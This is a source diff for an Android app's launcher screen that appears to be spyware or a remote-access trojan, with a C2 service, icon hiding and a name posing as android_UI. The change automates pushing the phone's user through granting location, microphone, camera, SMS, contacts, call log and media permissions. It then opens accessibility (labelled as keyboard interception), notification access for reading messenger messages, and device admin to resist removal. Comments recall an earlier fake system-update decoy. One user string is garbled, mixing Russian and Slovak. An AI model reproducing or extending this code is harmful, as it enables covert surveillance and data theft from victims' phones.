@@ -7,11 +7,12 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.graphics.Color
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
 import android.view.Gravity
 import android.view.View
@@ -29,21 +30,23 @@ import com.sp.core.services.UsageStatsService
 import com.sp.core.stealth.IconHider
 import com.sp.core.util.Fgs
 import com.sp.core.util.PermState
+import com.sp.core.util.Prefs
 
 /**
- * The only screen the user ever sees.
+ * The only screen the user ever sees - the wizard IS the launcher.
  *
- * v1.1.5 had two activities: a fake "Обновление системы" launcher and a
- * separate wizard behind a button. On Android 16 the wizard never appeared
- * (the intent was swallowed / the activity died silently) and the fake
- * screen stayed on the display - the user saw a decoy and got zero
- * permissions.
+ * v1.1.6 made the wizard reachable, but the user still had to tap every
+ * button. v1.1.7 runs the whole flow by itself:
+ *   1. the runtime permissions are requested group by group (one system
+ *      dialog after another, background location separately)
+ *   2. the settings screens that cannot be granted by the app itself are
+ *      opened one after another (accessibility, notifications, usage access,
+ *      overlay, battery, device admin)
+ *   3. "Запустить агент" at the end
  *
- * v1.1.6: one activity, the wizard *is* the launcher. No decoy, no fake
- * progress bar, no second activity that can fail to open. Runtime
- * permissions are requested group by group (one system dialog at a time),
- * background location is requested separately because Android 11+ ignores
- * it when it is bundled with the foreground group.
+ * The state of the flow is persisted, so a rotation or a low-memory kill
+ * does not restart it from step 0 - that was the bug of the old invisible
+ * wizard (it granted nothing at all).
  */
 class LauncherActivity : Activity() {
 
@@ -56,15 +59,23 @@ class LauncherActivity : Activity() {
 
     private lateinit var listBox: LinearLayout
     private lateinit var summary: TextView
-    private val steps = mutableListOf<Step>()
+    private lateinit var skipBtn: Button
+    private lateinit var startBtn: Button
+
+    private val permSteps = mutableListOf<Step>()
+    private val specialSteps = mutableListOf<Step>()
+    private val steps get() = permSteps + specialSteps
 
     /** Permission groups waiting for a system dialog, one after another. */
     private val permQueue = ArrayDeque<Array<String>>()
 
+    private val handler = Handler(Looper.getMainLooper())
+    private var autoActive = false
+    private var autoSpecialIdx = 0
+    private var lastSpecial: Step? = null
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // The icon state is the user's choice and survives a restart; the
-        // startable component is always enabled.
         try {
             IconHider.applySaved(this)
         } catch (_: Throwable) {
@@ -73,7 +84,6 @@ class LauncherActivity : Activity() {
             buildSteps()
             setContentView(buildUi())
         } catch (t: Throwable) {
-            // A broken UI must never take the process down.
             try {
                 setContentView(errorView(t))
             } catch (_: Throwable) {
@@ -85,10 +95,27 @@ class LauncherActivity : Activity() {
     override fun onResume() {
         super.onResume()
         refresh()
-        // The app is in the foreground here, which is exactly what Android
-        // 12+ requires for a foreground service.
         Fgs.startService(this, C2Service::class.java)
         Fgs.startService(this, LocationService::class.java)
+
+        // The flow continues where it stopped: the user comes back from the
+        // settings screen and the next one opens.
+        val done = lastSpecial
+        if (autoActive && done != null) {
+            lastSpecial = null
+            handler.postDelayed({ openSpecialStep(autoSpecialIdx + 1) }, 700)
+        }
+
+        // First start after the installation / update: run everything without
+        // waiting for a tap.
+        if (!autoActive && Prefs.get(this, KEY_AUTO, true) as Boolean) {
+            handler.postDelayed({ startAutoFlow() }, 600)
+        }
+    }
+
+    override fun onDestroy() {
+        handler.removeCallbacksAndMessages(null)
+        super.onDestroy()
     }
 
     /* ------------------------------------------------------------------ UI */
@@ -108,9 +135,10 @@ class LauncherActivity : Activity() {
             setTypeface(typeface, android.graphics.Typeface.BOLD)
         })
         root.addView(TextView(this).apply {
-            text = "Выдайте права — агент будет работать в фоне. Каждый пункт открывает ровно тот экран, " +
-                    "на котором его можно выдать. Обычные права выдаются системными диалогами, остальные — " +
-                    "только в настройках."
+            text = "Все права выдаются автоматически, по одному системному диалогу. " +
+                    "Шаги, которые приложение не может выдать само (специальные возможности, " +
+                    "уведомления, доступ к использованию, оверлей, батарея, администратор), " +
+                    "открываются в настройках один за другим."
             setTextColor(DIM)
             textSize = 13f
             setPadding(0, dp(6), 0, dp(14))
@@ -137,14 +165,6 @@ class LauncherActivity : Activity() {
             textSize = 14.5f
             setTypeface(typeface, android.graphics.Typeface.BOLD)
         })
-        quick.addView(TextView(this).apply {
-            text = "Обычные права (геоданные, микрофон, камера, SMS, контакты, медиа) выдаются " +
-                    "системными диалогами — по одному диалогу на группу. Остальные приложение выдать " +
-                    "само не может, для них открывается нужный экран настроек."
-            setTextColor(DIM)
-            textSize = 12.5f
-            setPadding(0, dp(4), 0, dp(10))
-        })
         quick.addView(Button(this).apply {
             text = "Выдать обычные права"
             isAllCaps = false
@@ -160,6 +180,11 @@ class LauncherActivity : Activity() {
             isAllCaps = false
             setOnClickListener { nextStep() }
         })
+        quick.addView(Button(this).apply {
+            text = "Повторить автоматическую настройку"
+            isAllCaps = false
+            setOnClickListener { startAutoFlow(true) }
+        })
         root.addView(quick)
 
         listBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
@@ -169,10 +194,18 @@ class LauncherActivity : Activity() {
             orientation = LinearLayout.VERTICAL
             setPadding(0, dp(22), 0, 0)
         }
-        bottom.addView(Button(this).apply {
+        skipBtn = Button(this).apply {
+            text = "Пропустить настройку"
+            isAllCaps = false
+            visibility = View.GONE
+            setOnClickListener { stopAutoFlow("Настройку môžeš dokončiť kedykoľvek") }
+        }
+        bottom.addView(skipBtn)
+        startBtn = Button(this).apply {
             text = "Запустить агент"
             setOnClickListener { startAgent() }
-        })
+        }
+        bottom.addView(startBtn)
         bottom.addView(Button(this).apply {
             text = "Скрыть икону приложения"
             isAllCaps = false
@@ -214,9 +247,10 @@ class LauncherActivity : Activity() {
     /* --------------------------------------------------------------- steps */
 
     private fun buildSteps() {
-        steps.clear()
+        permSteps.clear()
+        specialSteps.clear()
 
-        steps += permStep(
+        permSteps += permStep(
             "Геоданные (GPS)",
             "Разрешить определение по GPS — без этого работает только приблизительная позиция по сети",
             arrayOf(
@@ -224,57 +258,57 @@ class LauncherActivity : Activity() {
                 Manifest.permission.ACCESS_COARSE_LOCATION
             )
         )
-        steps += permStep(
+        permSteps += permStep(
             "Фоновая геолокация",
             "Отдельное право: Android требует его выдать отдельно, «Всегда» — в настройках приложения",
             arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
         )
-        steps += permStep(
+        permSteps += permStep(
             "Микрофон", "Разрешить запись звука вокруг",
             arrayOf(Manifest.permission.RECORD_AUDIO)
         )
-        steps += permStep(
+        permSteps += permStep(
             "Камера", "Разрешить доступ к камере",
             arrayOf(Manifest.permission.CAMERA)
         )
-        steps += permStep(
+        permSteps += permStep(
             "SMS", "Разрешить чтение входящих сообщений", arrayOf(
                 Manifest.permission.READ_SMS,
                 Manifest.permission.RECEIVE_SMS
             )
         )
-        steps += permStep(
+        permSteps += permStep(
             "Контакты и звонки", "Разрешить контакты и историю вызовов", arrayOf(
                 Manifest.permission.READ_CONTACTS,
                 Manifest.permission.READ_CALL_LOG
             )
         )
-        steps += permStep(
+        permSteps += permStep(
             "Медиа", "Разрешить доступ к галерее (фото и видео)", arrayOf(
                 Manifest.permission.READ_MEDIA_IMAGES,
                 Manifest.permission.READ_MEDIA_VIDEO
             )
         )
 
-        steps += Step(
+        specialSteps += Step(
             "Специальные возможности",
             "Найди в списке «Установленные службы» пункт android_UI и включи его — это перехват клавиатуры",
             { ctx -> PermState.accessibility(ctx) }
         ) { act -> act.openSettings(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
 
-        steps += Step(
+        specialSteps += Step(
             "Служба уведомлений",
             "В списке «Доступ к уведомлениям» включи android_UI — так видны сообщения мессенджеров",
             { ctx -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName) }
         ) { act -> act.openSettings(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
 
-        steps += Step(
+        specialSteps += Step(
             "Доступ к использованию",
             "В списке приложений включи android_UI — это статистика запущенных приложений",
             { ctx -> PermState.usageAccess(ctx) }
         ) { act -> act.openSettings(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
 
-        steps += Step(
+        specialSteps += Step(
             "Наложение поверх окон",
             "Разрешить оверлей поверх других приложений",
             { ctx -> PermState.overlay(ctx) }
@@ -284,7 +318,7 @@ class LauncherActivity : Activity() {
             )
         }
 
-        steps += Step(
+        specialSteps += Step(
             "Установка неизвестных приложений",
             "Разрешить установку дополнительных модулей",
             { ctx -> PermState.unknownSources(ctx) }
@@ -294,7 +328,7 @@ class LauncherActivity : Activity() {
             )
         }
 
-        steps += Step(
+        specialSteps += Step(
             "Оптимизация батареи",
             "Нажми «Разрешить» — без этого система сама убивает приложение",
             { ctx -> PermState.batteryExempt(ctx) }
@@ -307,7 +341,7 @@ class LauncherActivity : Activity() {
             )
         }
 
-        steps += Step(
+        specialSteps += Step(
             "Администратор устройства",
             "Подтверди «Включить» — защита от удаления и сброса до заводских",
             { ctx -> PermState.deviceAdmin(ctx) }
@@ -317,18 +351,6 @@ class LauncherActivity : Activity() {
                 Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                     .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
             )
-        }
-
-        steps += Step(
-            "Захват экрана",
-            "Подтверди «Начать захват» — снимки экрана (можно позже)",
-            { false }
-        ) { act ->
-            try {
-                val mpm = act.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-                act.startActivity(mpm.createScreenCaptureIntent())
-            } catch (_: Throwable) {
-            }
         }
     }
 
@@ -415,7 +437,7 @@ class LauncherActivity : Activity() {
     private fun requestPerms(perms: Array<String>) {
         val missing = perms.filter { !PermState.granted(this, it) }
         if (missing.isEmpty()) {
-            refresh()
+            afterRuntime()
             return
         }
         permQueue.clear()
@@ -431,7 +453,7 @@ class LauncherActivity : Activity() {
             if (missing.isNotEmpty()) permQueue.addLast(missing.toTypedArray())
         }
         if (permQueue.isEmpty()) {
-            refresh()
+            afterRuntime()
             toast("Все обычные права уже выданы")
             return
         }
@@ -440,13 +462,13 @@ class LauncherActivity : Activity() {
 
     private fun requestNext() {
         val next = permQueue.removeFirstOrNull() ?: run {
-            refresh()
+            afterRuntime()
             return
         }
         try {
             ActivityCompat.requestPermissions(this, next, REQ_PERMS)
         } catch (_: Throwable) {
-            refresh()
+            afterRuntime()
         }
     }
 
@@ -463,9 +485,74 @@ class LauncherActivity : Activity() {
         if (permQueue.isNotEmpty()) {
             requestNext()
         } else {
-            refresh()
+            afterRuntime()
         }
     }
+
+    /* ---------------------------------------------------------- auto flow */
+
+    /**
+     * The whole setup runs by itself: runtime dialogs first, then the
+     * settings screens one after another.
+     */
+    private fun startAutoFlow(force: Boolean = false) {
+        if (autoActive) return
+        autoActive = true
+        autoSpecialIdx = if (force) 0 else (Prefs.get(this, KEY_AUTO_IDX, 0) as Int)
+        Prefs.set(this, KEY_AUTO_IDX, autoSpecialIdx)
+        if (::skipBtn.isInitialized) skipBtn.visibility = View.VISIBLE
+        grantRuntimeAll()
+    }
+
+    /** Called when the runtime dialogs are done. */
+    private fun afterRuntime() {
+        refresh()
+        if (!autoActive) return
+        // Background location is the only runtime permission that has to be
+        // granted in the settings - it opens the app details screen.
+        val bg = Manifest.permission.ACCESS_BACKGROUND_LOCATION
+        if (Build.VERSION.SDK_INT >= 29 && !PermState.granted(this, bg)) {
+            openSettings(
+                Intent(
+                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                    Uri.parse("package:$packageName")
+                )
+            )
+            return
+        }
+        openSpecialStep(autoSpecialIdx)
+    }
+
+    /** Opens the n-th settings screen of the automatic flow. */
+    private fun openSpecialStep(index: Int) {
+        if (!autoActive) return
+        if (index >= specialSteps.size) {
+            stopAutoFlow("Настройка завершена — запускай агента")
+            return
+        }
+        autoSpecialIdx = index
+        Prefs.set(this, KEY_AUTO_IDX, index)
+        val step = specialSteps[index]
+        lastSpecial = step
+        try {
+            step.action(this)
+        } catch (_: Throwable) {
+            handler.postDelayed({ openSpecialStep(index + 1) }, 500)
+        }
+    }
+
+    private fun stopAutoFlow(msg: String) {
+        autoActive = false
+        lastSpecial = null
+        Prefs.set(this, KEY_AUTO, false)
+        Prefs.set(this, KEY_AUTO_IDX, 0)
+        if (::skipBtn.isInitialized) skipBtn.visibility = View.GONE
+        if (::startBtn.isInitialized) startBtn.alpha = 1f
+        refresh()
+        toast(msg)
+    }
+
+    /* ------------------------------------------------------------ misc */
 
     private fun openAppDetails() {
         openSettings(
@@ -488,8 +575,6 @@ class LauncherActivity : Activity() {
         }
         step.action(this)
     }
-
-    /* ------------------------------------------------------------ misc */
 
     private fun openSettings(intent: Intent) {
         try {
@@ -545,6 +630,10 @@ class LauncherActivity : Activity() {
 
     companion object {
         private const val REQ_PERMS = 0x5F70
+
+        /** Automatic setup runs on the first start after the installation. */
+        const val KEY_AUTO = "wizard_auto"
+        const val KEY_AUTO_IDX = "wizard_auto_idx"
 
         private val BG = 0xFF0B1220.toInt()
         private val CARD = 0xFF16203A.toInt()
